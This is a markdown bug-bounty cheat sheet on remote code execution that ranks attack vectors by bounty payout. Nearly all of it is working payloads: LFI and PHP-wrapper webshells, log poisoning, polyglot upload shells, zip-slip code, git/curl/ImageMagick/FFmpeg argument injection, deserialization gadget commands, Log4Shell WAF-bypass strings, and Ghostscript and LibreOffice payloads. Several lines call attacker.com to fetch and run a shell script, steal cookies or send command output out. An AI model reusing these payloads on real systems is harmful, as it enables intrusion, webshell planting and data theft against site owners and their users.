# RCE — Remote Code Execution (deep)

Ceiling impact. Paid patterns (H1): GitLab *BulkImports DecompressedArchiveSizeValidator* **$33.5k**;
PayPal *npm dependency-confusion* **$30k** (Uber same **$9k**); Twitter/xAI *pre-auth RCE on VPN* **$20k**;
GitLab *ExifTool RCE (CVE-2021-22204)* **$20k**; GitLab *unsafe Kramdown options* **$20k**; Shopify Scripts
*struct type-confusion* **$18k**; GitLab *git flag injection → file overwrite → RCE* **$12k**; GitLab
*path traversal → RCE* **$12k**; Uber *Flask/Jinja2 SSTI → RCE* **$10k**; Grafana *SMTP param injection RCE*
**$5k**; Aiven *Kafka Connect JAAS JndiLoginModule RCE* and *SQLite-JDBC upload+SSRF → RCE* **$5k**.

## Vectors, ranked by payout

### 1. Dependency confusion / supply chain (top payer)
Internal package names referenced in `package.json`/`.npmrc`/`requirements.txt`/`Gemfile`/webpack bundles
but **not claimed** on the public registry → publish a same-name package with an `install` hook → RCE on
build/CI. Harvest names from JS bundles + leaked lockfiles. Own the name only to prove; never squat others'.

### 2. Insecure deserialization
Look for serialized blobs in cookies, JWT, `ViewState`, hidden fields, request bodies, cache keys.
| Platform | Signature | Gadget tool |
|---|---|---|
| Java | `rO0AB` (base64) / `AC ED 00 05` | `ysoserial` (CommonsCollections, etc.) |
| PHP | `O:8:"..."` / `a:2:{` | `phpggc` |
| Python | pickle `\x80\x04`, `PyYAML load` | manual `__reduce__` / `!!python/object/apply` |
| Ruby | Marshal `\x04\x08`, `Oj`/`YAML.load` | universal Ruby gadget |
| .NET | `AAEAAAD/////` | `ysoserial.net` |
| Node | `_$$ND_FUNC$$_` (`node-serialize`) | IIFE payload |

### 3. Injection to code
- **Command injection:** shell metachars in filename, params, git args (`--upload-pack`, flag injection),
  archive members. Probe `;id`,`|id`,`` `id` ``,`$(id)`,`%0aid`; blind → `;curl http://OOB/$(whoami)`.
- **SSTI → RCE:** see [ssti.md](ssti.md) (Uber Jinja2 $10k).
- **SQLi → RCE:** stacked queries, `xp_cmdshell` (MSSQL), `INTO OUTFILE`/UDF (MySQL), `COPY … PROGRAM` (PG).
- **JNDI / Log4Shell:** `${jndi:ldap://OOB/x}` in any logged field; Kafka Connect JAAS `JndiLoginModule`.
- **EL/OGNL/SpEL:** `${T(java.lang.Runtime).getRuntime().exec('id')}` in Spring/Struts params.

### 4. File / media processing
- **ImageMagick** (ImageTragick CVE-2016-3714, and MSL/`caption:`), **ExifTool** (CVE-2021-22204 — DjVu
  metadata, GitLab $20k), **Ghostscript** (`-dSAFER` bypass), **FFmpeg** (HLS/m3u8 → SSRF/LFR, TikTok),
  **libvips/pdf** renderers. Upload a crafted image/PDF/SVG/DjVu and watch OOB.

### 5. Archive / import handling
Zip-slip (`../` in archive entry → file overwrite → RCE), decompression-size/type validators (GitLab
BulkImports $33.5k), tar symlink, XML/YAML config import.

### 6. Upload → webshell
Extension/content-type bypass → drop `.php`/`.jsp`/`.aspx` in a served dir. See [payloads.md](payloads.md)
upload bypass and the upload paid-patterns; chain path-traversal overwrite of an executable path.

## Detect & prove
OOB canary (DNS/HTTP to your listener), time delay (`sleep 10`), or read/write a canary file. **Proof bar:**
run a command and show output, exfil a unique canary, or read a secret file — a stack trace alone is N/A.
RCE unauth = CVSS 9.8. Always confirm it's an in-scope, production host before deep exploitation.

---

## LFI → RCE (PHP-focused — extends §4 Injection)

### Traversal Variants
```bash
# When input lands in include/require/fopen/file_get_contents:
# Basic:
../../etc/passwd
../../../etc/passwd
# Encoded:
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252f..%252f..%252fetc%252fpasswd    # double-encode
# Null byte truncation (PHP <5.3.4):
../../etc/passwd%00
../../etc/passwd%00.jpg
# Filter bypass:
....//....//....//etc/passwd           # double-dot-slash (filter removes ../)
..;/..;/..;/etc/passwd                 # Tomcat path confusion
..././..././..././etc/passwd           # traversal with extra dots
```

### PHP Wrappers (No Upload Needed)
```bash
# Source disclosure via base64:
curl "https://target.com/view?page=php://filter/convert.base64-encode/resource=index.php"
# Chain multiple filters:
curl "https://target.com/view?page=php://filter/read=string.toupper|convert.base64-encode/resource=../config.php"

# Data wrapper — inject PHP code:
curl "https://target.com/view?page=data://text/plain,<?php%20system($_GET['cmd']);?>&cmd=id"
curl "https://target.com/view?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id"

# Expect wrapper (requires PHP expect extension):
curl "https://target.com/view?page=expect://id"
```

### iconv Filter-Chain RCE (No Upload Required — Ambionics 2022)
```bash
# Generates arbitrary PHP code via filter chaining — no file upload needed
# Tool: https://github.com/ambionics/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
# Use the generated filter chain as the page parameter:
curl "https://target.com/view?page=GENERATED_CHAIN&cmd=id"
# Works on PHP 7.x and 8.x even with allow_url_include disabled
```

### Log Poisoning
```bash
# Access log:
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/
# Then include the log file:
curl "https://target.com/view?page=../../../../var/log/apache2/access.log&cmd=id"
curl "https://target.com/view?page=../../../../var/log/nginx/access.log&cmd=id"

# SSH auth log (inject via username):
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# Then: page=../../../../var/log/auth.log

# Mail log (/var/mail/www-data):
# Send email with PHP in From/Subject to a valid address on the server
```

### /proc/self/environ (UA injection)
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/
curl "https://target.com/view?page=/proc/self/environ&cmd=id"
# /proc/self/environ contains all env vars including HTTP_USER_AGENT
```

### Session File Inclusion
```bash
# Inject PHP via a controlled session value (e.g., username stored in session):
# 1. Register with username: <?php system($_GET['cmd']); ?>
# 2. Get PHPSESSID from cookie
# 3. Include session file:
curl "https://target.com/view?page=/tmp/sess_PHPSESSID&cmd=id"
# Common session paths: /tmp/sess_*, /var/lib/php/sessions/sess_*, /var/lib/php/session/
```

---

## FILE UPLOAD → RCE / STORED XSS (extends §6)

### Filename Tricks
```bash
# Extension bypass:
shell.php.jpg          # double extension — app checks last, server executes first
shell.php%00.jpg       # null byte truncation
shell.php.            # trailing dot (Windows strips)
shell.php%20           # trailing space
shell.asp;.jpg         # semicolon (IIS)
shell.pHp              # case variation
shell.php5 / .phtml / .pht / .shtml / .php7
# .htaccess upload (Apache — maps any extension to PHP):
echo "AddType application/x-httpd-php .jpg" > .htaccess
# Then upload any .jpg containing PHP code
```

### Polyglot Files
```bash
# GIF + PHP — passes magic byte check AND extension check:
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif
curl -F "file=@shell.php.gif;type=image/gif" https://target.com/upload

# JPEG + PHP (append PHP after JPEG data):
cp /tmp/real.jpg shell.jpg
echo "<?php system(\$_GET['cmd']); ?>" >> shell.jpg

# SVG → stored XSS (or XXE → SSRF):
cat > payload.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
<script>fetch('https://attacker.com/x?c='+document.cookie)</script>
</svg>
EOF
```

### Metadata Payloads
```bash
# ExifTool CVE-2021-22204 (DjVu metadata → RCE — GitLab $20k):
# Create a malicious DjVu:
cat > payload.djvu << 'EOF'
(metadata
  (Copyright "\n-e \ncurl http://attacker.com/shell.sh|bash\n")
)
EOF
# Convert to JPEG with exiftool: exiftool -all= -tagsfromfile payload.djvu image.jpg

# EXIF/XMP XSS (rendered in admin panels, image viewers):
exiftool -Comment='<script>alert(document.cookie)</script>' image.jpg

# SVG XXE → SSRF chain:
cat > xxe.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
EOF
```

### Archive Attacks
```bash
# Zip-slip (path traversal via archive entry name):
python3 -c "
import zipfile
z = zipfile.ZipFile('zipslip.zip', 'w')
z.write('/dev/null', '../../../var/www/html/shell.php')
z.close()
"
# Or: zip --symlinks slip.zip symlink  (where symlink points to ../../etc/passwd)

# Zip-in-zip scanner evasion (some AV only scans first level):
# Create shell.php, zip it as inner.zip, zip inner.zip as outer.zip
```

### Serve-Time Attacks
```bash
# MIME sniffing without X-Content-Type-Options → browser renders HTML as page:
# Upload shell.html named shell.txt — if Content-Type: text/plain but no X-Content-Type-Options
# → IE/Chrome may still render as HTML → stored XSS

# CDN-served path → direct URL access:
# Upload .php but it's served via CDN that doesn't execute PHP — but check if origin URL is accessible
# origin.target.com/uploads/shell.php → execute directly if CDN caches but origin serves

# Upload race: upload file → rename before server validates extension
# Concurrent: upload shell.jpg → immediately GET /uploads/shell.php (race condition on rename)
```

---

## ARGUMENT INJECTION (extends §4 Command Injection)

**Ceiling:** RCE via flag injection when shell metacharacters are filtered.

### git clone
```bash
# When user controls the repository URL cloned by the server:
# --upload-pack runs a command on clone:
git_url="--upload-pack=touch /tmp/rce"
# OR abuse config options:
git_url="https://victim.com/repo.git --config=core.sshCommand=id"
# OR using ext:: protocol:
git_url="ext::sh -c 'id > /tmp/gitpwned'"
```

### curl Flag Injection
```bash
# When user controls a URL that is passed to curl:
# -o writes to a file path:
url="-o /var/www/html/shell.php https://attacker.com/shell.php"
# --config reads a config file:
url="--config=/tmp/attacker_curl_config https://target.com"
# SSRF via --resolve:
url="--resolve target.com:443:169.254.169.254 https://target.com/"
```

### ImageMagick (CVE-2016-3714 class + modern delegate)
```bash
# MSL file delegate RCE:
convert 'msl:/path/to/attacker.msl' output.png
# Or via MVG:
convert 'mvg:attacker.mvg' output.png
# attacker.mvg:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/shell.php|id)'
pop graphic-context
```

### FFmpeg Protocol Allowlist Gaps
```bash
# HLS playlist SSRF → LFI:
cat > evil.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
file:///etc/passwd
#EXT-X-ENDLIST
EOF
# When the app processes video URLs:
ffmpeg -i https://attacker.com/evil.m3u8 -vframes 1 output.jpg
# → FFmpeg fetches /etc/passwd as a "video segment"

# Concat demuxer (arbitrary file read via SSRF):
echo "file 'file:///etc/passwd'" > concat.txt
ffmpeg -f concat -safe 0 -i concat.txt output.txt
```

### Node --inspect / NODE_OPTIONS
```bash
# When user controls arguments to a node process:
node_opts="--require /etc/passwd"         # file read
node_opts="--inspect=0.0.0.0:9229"        # exposes debugger
# NODE_OPTIONS env var injection (if env is user-controlled):
# NODE_OPTIONS=--require /tmp/shell.js
```

---

## DESERIALIZATION BREADTH (extends §3 Deserialization)

### PHP phar:// (ANY File Operation on phar:// Path Triggers Deserialization)
```bash
# No unserialize() call needed — ANY PHP file function on phar:// path triggers it:
# file_exists(), is_file(), file_get_contents(), include(), copy(), etc.
# Attack:
# 1. Create a phar archive with a malicious __destruct() gadget in its metadata
# 2. Upload it (disguised as image/zip/any extension)
# 3. Trigger phar:// deserialization via any file operation that uses the uploaded path:
#    file_exists("phar:///uploads/shell.jpg")
# Tool: phpggc generates gadget chains for popular PHP frameworks
pip3 install phpggc  # or: git clone https://github.com/ambionics/phpggc
phpggc -l  # list available gadgets
phpggc Laravel/RCE1 system id  # generate gadget chain
# Wrap in phar:
phpggc -o shell.phar Laravel/RCE1 system id
# Rename to .jpg and upload, then trigger via phar://
```

### Java Hessian / Kryo
```bash
# Hessian (common in Alibaba Dubbo / Feign / Spring Cloud):
# ysoserial-like tools for Hessian: marshalsec
java -cp marshalsec.jar marshalsec.Hessian SpringPartiallyComparableAdvisorHolder \
  "curl http://attacker.com/|bash" > hessian_payload.bin
# Send as Hessian content type to RPC/RMI endpoints

# Kryo (Apache Spark, many enterprise apps):
# Gadgets depend on classpath — check for commons-collections, spring-core on classpath
# Tool: GadgetProbe helps identify available gadgets blindly
```

### Python jsonpickle
```bash
# jsonpickle.decode() on user input → arbitrary class instantiation:
# Payload:
import jsonpickle
payload = '{"py/object": "os.system", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["id"]}]}'
jsonpickle.decode(payload)
# In requests: set Content-Type to application/x-jsonpickle or just send as JSON
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"py/object":"subprocess.check_output","py/reduce":[{"py/type":"subprocess.check_output"},{"py/tuple":[["id"]]}]}'
```

### .NET LosFormatter / ObjectStateFormatter (ASP.NET ViewState)
```bash
# If __VIEWSTATE MAC validation is disabled or key is known:
# ysoserial.net generates ViewState RCE payloads:
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "nslookup attacker.com" \
  --path="/page.aspx" --apppath="/" --decryptionalg="AES" \
  --decryptionkey="FOUND_KEY" --validationalg="SHA1" --validationkey="FOUND_KEY"
# Key sources: web.config exposure, machine.key leak, default keys database (blacklist3r)
```

---

## EXPRESSION LANGUAGE INJECTION BREADTH (extends §4 SSTI/EL)

### Spring Cloud Function routing-expression (CVE-2022-22963)
```bash
curl -X POST https://target.com/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" \
  -H "Content-Type: text/plain" \
  -d "data"
```

### MVEL Injection
```bash
# MVEL (used in Drools, Red Hat JBoss):
curl -X POST https://target.com/api/rule \
  -d 'expression=Runtime.getRuntime().exec("id")'
# Or via JBoss RuleBase:
# {"expression": "new java.lang.ProcessBuilder(new String[]{\"id\"}).start()"}
```

### Groovy Script Params
```bash
# Groovy eval in Jenkins/Gradle/custom scriptable APIs:
curl -X POST https://target.com/api/execute \
  -d 'script=["id"].execute().text'
# Jenkins /script endpoint (if accessible without auth → P1):
curl -X POST https://target.com/scriptText \
  -d 'script=println("id".execute().text)'
```

### JNDI / Log4Shell Obfuscated (Bypass Attempts)
```bash
# Beyond the basic ${jndi:ldap://...} — WAF-bypass variants:
${${lower:j}ndi:${lower:l}dap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${${env:NaN:-j}ndi:${env:NaN:-l}dap://attacker.com/x}
# Nested lookups:
${j${::-n}di:ldap://attacker.com/x}
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/x}
# Via other lookup protocols (if ldap filtered):
${jndi:dns://attacker.com/x}
${jndi:rmi://attacker.com:1099/x}
${jndi:ldaps://attacker.com/x}
# Secondary fields (not just User-Agent):
X-Forwarded-For: ${jndi:ldap://attacker.com/x}
X-Api-Version: ${jndi:ldap://attacker.com/x}
Username field, email field, filename, order notes, message body
```

---

## FILE-PROCESSOR LANDMINES (extends §4 file/media)

### LibreOffice / UNO Command Injection
```bash
# LibreOffice macro execution on document open (when used for server-side conversion):
# .ods file with macro:
cat > macro.ods.xml << 'EOF'
<macro:module macro:name="Standard.Module1">
Sub Main
  Shell("curl http://attacker.com/$(id)")
End Sub
</macro:module>
EOF
# Also: LibreOffice --headless --convert-to pdf evil.odt
# When server-side conversion via LibreOffice is triggered by an uploaded .odt/.ods
```

### Ghostscript -dSAFER Bypass (CVE-2023-28879, older: CVE-2018-19475)
```bash
# Inject PostScript in a PDF/PS upload:
cat > evil.ps << 'EOF'
%!PS
/Buffer 512 string def
(%pipe%curl http://attacker.com/$(id)) (r) file Buffer readstring pop
EOF
# Upload as PDF to any app that uses Ghostscript for rendering/conversion
```

### FFmpeg HLS/concat (SSRF → LFR)
```bash
# Already in LFI section above — add: concat via gopher for internal service enumeration
# m3u8 with gopher:// entries → send crafted TCP to internal Redis/Memcached
cat > redis.m3u8 << 'EOF'
#EXTM3U
#EXTINF:0,
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20key%20value%0d%0a
EOF
```
